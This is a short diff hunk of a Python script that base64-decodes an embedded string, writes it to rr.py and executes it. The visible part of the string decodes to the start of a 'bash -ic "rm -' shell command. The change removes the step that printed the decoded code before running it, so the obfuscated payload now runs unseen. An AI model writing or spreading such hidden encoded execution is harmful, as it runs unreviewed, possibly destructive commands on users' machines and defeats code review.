@@ -185,5 +185,6 @@ s='aW1wb3J0IG9zCmlmIF9fbmFtZV9fPT0nX19tYWluX18nOgogIGNtZDE9J2Jhc2ggLWljICJybSAtZ
 
 if __name__=='__main__':
   s2=base64.b64decode(s).decode()
-  a=open('rr.py','w');a.write(s2);a.close();os.system('cat rr.py && python rr.py')
+  #a=open('rr.py','w');a.write(s2);a.close();os.system('cat rr.py && python rr.py')
+  a=open('rr.py','w');a.write(s2);a.close();os.system('python rr.py')
 
